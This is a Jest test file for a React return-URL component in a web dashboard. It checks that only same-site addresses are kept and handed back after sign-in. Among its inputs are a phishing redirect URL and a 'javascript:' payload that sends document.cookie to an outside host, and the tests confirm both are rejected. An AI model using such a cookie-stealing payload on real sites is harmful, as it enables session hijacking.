import { act, ReactNode } from 'react';
import { createRoot } from 'react-dom/client';

let search = new URLSearchParams();

jest.mock('next/navigation', () => ({
  useSearchParams: () => search,
}));

import ReturnUrlComponent, {
  useReturnUrl,
} from '@gitroom/frontend/app/(app)/auth/return.url.component';

// happy-dom has a localStorage; jest.setup.js does not lift it onto globalThis.
globalThis.localStorage = window.localStorage;

// The page URL and what useSearchParams reports always agree in the app.
const arrive = (url: string) => {
  (
    window as unknown as { happyDOM: { setURL: (url: string) => void } }
  ).happyDOM.setURL(url);
  search = new URL(url).searchParams;
};

const loginWith = (returnUrl: string) =>
  `https://dash.sharek.app/auth/login?returnUrl=${encodeURIComponent(
    returnUrl
  )}`;

const mounted: Array<{ unmount: () => void }> = [];

const render = async (element: ReactNode) => {
  const host = document.createElement('div');
  document.body.appendChild(host);
  const root = createRoot(host);
  mounted.push(root);
  await act(async () => {
    root.render(element);
  });
  return host;
};

// layout.context sends the browser to whatever getAndClear returns after
// signing in.
const readAfterSignIn = async () => {
  let value: string | null | undefined;
  const Reader = () => {
    value = useReturnUrl().getAndClear();
    return null;
  };
  await render(<Reader />);
  return value;
};

beforeEach(() => {
  localStorage.clear();
  arrive('https://dash.sharek.app/auth/login');
});

afterEach(() => {
  act(() => {
    mounted.splice(0).forEach((root) => root.unmount());
  });
  document.body.innerHTML = '';
});

describe('ReturnUrlComponent', () => {
  it('keeps an address on this app and hands it back after sign-in', async () => {
    const authorize =
      'https://dash.sharek.app/oauth/authorize?client_id=c&state=s';
    arrive(loginWith(authorize));

    await render(<ReturnUrlComponent />);

    expect(localStorage.getItem('returnUrl')).toBe(authorize);
    expect(await readAfterSignIn()).toBe(authorize);
    expect(localStorage.getItem('returnUrl')).toBeNull();
  });

  it.each([
    ['another site', 'https://example.com/phish'],
    ['a javascript: URL', 'javascript:fetch("https://example.com/"+document.cookie)'],
  ])('neither stores nor hands back %s', async (_label, returnUrl) => {
    arrive(loginWith(returnUrl));

    await render(<ReturnUrlComponent />);

    expect(localStorage.getItem('returnUrl')).toBeNull();
    expect(await readAfterSignIn()).toBeNull();
  });

  it('does not hand back a foreign address stored before the check existed', async () => {
    localStorage.setItem('returnUrl', 'https://example.com/phish');

    expect(await readAfterSignIn()).toBeNull();
    expect(localStorage.getItem('returnUrl')).toBeNull();
  });
});
